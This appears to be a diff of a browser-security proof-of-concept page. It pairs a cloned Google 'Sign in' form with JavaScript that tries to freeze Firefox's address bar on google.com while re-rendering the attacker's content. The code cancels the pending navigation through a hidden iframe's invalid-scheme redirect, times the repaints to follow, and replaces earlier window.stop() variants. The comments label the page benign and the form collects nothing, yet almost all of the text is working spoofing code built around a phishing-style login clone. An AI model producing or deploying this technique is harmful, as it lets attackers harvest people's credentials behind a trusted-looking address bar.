@@ -15,12 +15,12 @@
 </style>
 </head>
 <body>
-  <div class="box">
+  <div id="app" class="box">
     <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
     <h1 style="font-weight:400;font-size:1.5rem;margin:.2rem 0">Sign in</h1>
     <p style="color:#5f6368;margin-bottom:1.5rem">Use your Google Account</p>
-    <!-- BENIGN: form does not submit/collect anything; marker only. -->
-    <form onsubmit="document.body.innerHTML='<h1>SPOOF PoC: content is attacker-controlled</h1>';return false;">
+    <!-- BENIGN: no submit/collection; marker only. -->
+    <form onsubmit="document.body.innerHTML='<h1>SPOOF PoC: content attacker-controlled</h1>';return false;">
       <input class="in" type="email" placeholder="Email or phone" required>
       <input class="in" type="password" placeholder="Password" required>
       <div style="text-align:left;margin-bottom:1.5rem"><a class="lnk" href="#">Forgot password?</a></div>
@@ -29,37 +29,32 @@
   </div>
 
 <script>
-/* Address-bar spoof test — content-preserving.
-   Goal: bar shows a trusted host while THIS document stays rendered.
-   Two variants; try VARIANT A first, then B. Keep benign. */
+/* Firefox address-bar spoof test: freeze bar on google.com, then RE-RENDER content.
+   Benign. Tune the delays if the re-render races the interrupt. */
+var SAVED = document.getElementById('app').outerHTML;
 
-var MODE = location.hash === '#b' ? 'B' : 'A';   // open ...#b to try variant B
+// 1) bar -> google.com (204 beacon, no real document swap)
+setTimeout(function () {
+  try { window.open('https://www.google.com/csi', '_self'); } catch (e) {}
+}, 50);
 
-if (MODE === 'A') {
-  /* VARIANT A — hanging resource + re-pin via window.stop().
-     Navigate toward google.com but to a non-responsive port so it never commits;
-     repeatedly stop() so the pending nav freezes with the trusted host in the bar
-     while this document remains. */
-  setTimeout(function () {
-    try { window.location = 'https://www.google.com:8443/'; } catch (e) {}
-    var n = 0, iv = setInterval(function () {
-      try { window.stop(); } catch (e) {}
-      if (++n >= 12) clearInterval(iv);
-    }, 250);
-  }, 1200);
-} else {
-  /* VARIANT B — named-window reuse (Opera/Orion-proven V2 shape).
-     Open a hanging google URL in a new context, then write attacker markup into it.
-     Here we keep THIS page's content and just move the bar. */
-  setTimeout(function () {
-    var t = window.open('https://www.google.com:8443/', '_self');
-    var saved = document.documentElement.outerHTML;
-    var n = 0, iv = setInterval(function () {
-      try { window.stop(); } catch (e) {}
-      if (++n >= 12) clearInterval(iv);
-    }, 250);
-  }, 1200);
+// 2) freeze the pending bar via an invalid-scheme interrupt (your original trick)
+setTimeout(function () {
+  var f = document.createElement('iframe');
+  f.style.display = 'none';
+  f.srcdoc = "<script>setTimeout(function(){location='x://'},40)<\/script>";
+  document.body.appendChild(f);
+}, 70);
+
+// 3) re-render attacker content AFTER the interrupt settles (bar should stay google.com)
+function repaint() {
+  try {
+    if (!document.getElementById('app')) {
+      document.body.innerHTML = SAVED;
+    }
+  } catch (e) {}
 }
+[300, 500, 800, 1200].forEach(function (t) { setTimeout(repaint, t); });
 </script>
 </body>
 </html>
